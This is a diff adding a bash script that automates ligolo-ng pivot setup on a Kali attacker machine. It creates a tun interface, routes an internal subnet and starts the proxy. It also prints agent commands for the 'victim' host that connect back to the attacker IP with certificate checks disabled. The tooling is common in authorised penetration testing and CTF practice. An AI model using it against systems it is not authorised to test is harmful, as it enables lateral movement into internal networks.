@@ -1,0 +1,94 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${RED}Usage: ligolo <kali_ip> <port> <internal_subnet>${NC}"
+    echo -e "${RED}  Ex:  ligolo 10.10.14.5 11601 172.16.1.0/24${NC}"
+    echo -e "${RED}  Ex:  ligolo 10.10.14.5 11601 192.168.1.0/24${NC}"
+    echo ""
+    echo -e "${BLUE}  internal_subnet → from 'ipconfig' or 'ip a' on victim${NC}"
+    exit 1
+}
+
+[ "$#" -ne 3 ] && usage
+
+KALI_IP="$1"
+PORT="$2"
+SUBNET="$3"
+
+# Auto-detect ligolo-proxy binary
+find_proxy() {
+    for path in \
+        "$(which ligolo-proxy 2>/dev/null)" \
+        "/usr/local/bin/ligolo-proxy" \
+        "/opt/ligolo-ng/proxy" \
+        "/opt/ligolo/proxy" \
+        "$HOME/tools/ligolo-ng/proxy" \
+        "$HOME/Tools/ligolo-ng/proxy"
+    do
+        [ -x "$path" ] && echo "$path" && return
+    done
+}
+
+PROXY=$(find_proxy)
+if [ -z "$PROXY" ]; then
+    echo -e "${RED}[!] ligolo-proxy not found. Common locations:${NC}"
+    echo -e "${RED}    /usr/local/bin/ligolo-proxy${NC}"
+    echo -e "${RED}    /opt/ligolo-ng/proxy${NC}"
+    echo -e "${RED}Install: https://github.com/nicocha30/ligolo-ng/releases${NC}"
+    exit 1
+fi
+
+echo ""
+echo -e "${YELLOW}== Ligolo Setup ==${NC}"
+echo -e "${CYAN}Proxy:  $PROXY${NC}"
+echo -e "${CYAN}Listen: 0.0.0.0:$PORT${NC}"
+echo -e "${CYAN}Route:  $SUBNET${NC}"
+echo ""
+
+# Setup tun interface
+echo -e "${BLUE}[*] Setting up tun interface...${NC}"
+if ! ip link show ligolo &>/dev/null; then
+    sudo ip tuntap add user "$(whoami)" mode tun ligolo
+    sudo ip link set ligolo up
+    echo -e "${GREEN}[+] Interface ligolo created${NC}"
+else
+    echo -e "${YELLOW}[~] Interface ligolo already exists${NC}"
+fi
+
+# Add route
+echo -e "${BLUE}[*] Adding route $SUBNET → ligolo${NC}"
+if ! ip route show | grep -q "$SUBNET"; then
+    sudo ip route add "$SUBNET" dev ligolo
+    echo -e "${GREEN}[+] Route added${NC}"
+else
+    echo -e "${YELLOW}[~] Route already exists${NC}"
+fi
+
+# Print victim commands
+echo ""
+echo -e "${YELLOW}== Run on victim ==${NC}"
+echo -e "${CYAN}[Windows]${NC}"
+echo "  .\\agent.exe -connect $KALI_IP:$PORT -ignore-cert"
+echo ""
+echo -e "${CYAN}[Linux]${NC}"
+echo "  ./agent -connect $KALI_IP:$PORT -ignore-cert"
+echo ""
+
+# Print post-connect instructions
+echo -e "${YELLOW}== After agent connects ==${NC}"
+echo -e "  ligolo-ng » ${GREEN}session${NC}   ← select session"
+echo -e "  ligolo-ng » ${GREEN}start${NC}     ← start tunnel"
+echo ""
+
+# Start proxy (foreground)
+echo -e "${BLUE}[*] Starting proxy on 0.0.0.0:$PORT ...${NC}"
+echo -e "${YELLOW}(Ctrl+C to stop)${NC}"
+echo ""
+sudo "$PROXY" -selfcert -laddr "0.0.0.0:$PORT"
